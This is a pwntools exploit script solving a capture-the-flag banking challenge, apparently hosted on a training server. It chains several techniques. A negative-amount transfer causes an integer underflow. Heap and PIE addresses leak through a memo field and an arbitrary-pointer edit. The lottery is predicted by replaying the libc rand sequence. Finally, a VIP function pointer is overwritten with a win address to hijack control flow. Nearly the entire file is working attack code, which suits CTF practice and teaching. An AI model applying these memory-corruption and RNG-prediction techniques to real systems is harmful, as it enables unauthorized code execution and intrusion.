#!/usr/bin/env python3
from pwn import *
import ctypes

HOST = "pwn-bk88-35885b3dda6f.training.bksec.vn"
PORT = 1337


elf = context.binary = ELF("./chall_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=True, sni=HOST)
    return elf.process()

def gdb_attach(io):
    if not args.REMOTE:
        gdb.attach(io, gdbscript="""
            set resolve-heap-via-heuristic force
            brva 0x0000000000002D56
            brva 0x00000000000017E0
            brva 0x0000000000002A34
            brva 0x0000000000002247

            set follow-fork-mode parent
            continue
        """)

def GDB():
    gdb_attach(p)


p = conn()

def sla(prompt, data):
    p.sendlineafter(prompt, data)

def sa(prompt, data):
    p.sendafter(prompt, data)

def menu(choice):
    sla(b"Lua chon : ", str(choice).encode())

def register(user_id, password):
    menu(6)
    sla(b"ID : ", user_id)
    sla(b"Password : ", password)

def login(user_id, password):
    menu(7)
    sla(b"ID : ", user_id)
    sla(b"Password : ", password)

def account_info():
    menu(1)

def history():
    menu(2)

def transfer(account_number, amount, vip=False):
    menu(8 if vip else 3)
    sla(b"Nhap account number nguoi nhan", str(account_number).encode())
    sla(b"Nhap so tien", str(amount).encode())

def loan():
    menu(4)

def lottery(numbers):
    menu(5)
    for index, number in enumerate(numbers, 1):
        sla(f"[{index}] : ".encode(), str(number).encode())

def user_info():
    menu(7)
    sla(b"Input : ", b'1')

def user_delete():
    # menu(7)
    sla(b"Input : ", b'3')

def user_edit(payload):
    # menu(7)
    sla(b"Input : ", b'2')
    sa(b'\n', payload)

def logout(vip=False):
    menu(9 if vip else 8)


# Step 1: Leak heap -> leak PIE

register(b'douku1', b'123123')
register(b'douku2', b'123123')
# GDB()
login(b'douku1', b'123123')
account_info()
p.recvuntil(b'Account number : ')
acc_number1 = int(p.recvline().strip())

logout()
login(b'douku2', b'123123')
transfer(acc_number1, -250000000)

for i in range(19):
    transfer(acc_number1, 10)


history()
logout(True)
login(b'douku1', b'123123')

loan()

user_info()
p.recvuntil(b'Memo : ')
heap = (u64(p.recv(6) + b'\0'*2) >> 12) << 12
log.success(f'heap :{hex(heap)}')

user_edit(p64(heap + 0x860)) # PIE + 0x1aee
sla(b'Input : ', b'0')
# GDB()
history()
p.recvuntil(b'So du : ')
PIE = int(p.recvline().strip()) - 0x1aee

# Stage 2: Trigger vip funtion pointer -> win

logout()
login(b'douku2', b'123123')
for i in range(6):
    loan()


rng = ctypes.CDLL("libc.so.6")

rng.srand.argtypes = [ctypes.c_uint]
rng.srand.restype = None

rng.rand.argtypes = []
rng.rand.restype = ctypes.c_int

def predict_lottery(rand_calls):
    rng.srand(1)
    for _ in range(rand_calls):
        rng.rand()

    seed = rng.rand() % 0x1337
    rng.srand(seed)

    numbers = []
    while len(numbers) < 7:
        number = rng.rand() % 37 + 1

        if number not in numbers:
            numbers.append(number)

    return seed, numbers


seed, numbers = predict_lottery(9)
log.success(f"Seed: {seed}")
log.success(f"Lottery: {numbers}")

lottery(numbers)

sa(b'Name : \n', b'd1nhdwc')
win = PIE + 0x13a9
# GDB()
sla(b'CCCD : \n', str(win).encode())

sla(b'Lua chon : ', '8')
sla(b'nguoi nhan\n', str(acc_number1).encode())
sla(b'Nhap so tien\n', b'iloverem')


p.interactive()

# d1nhdwc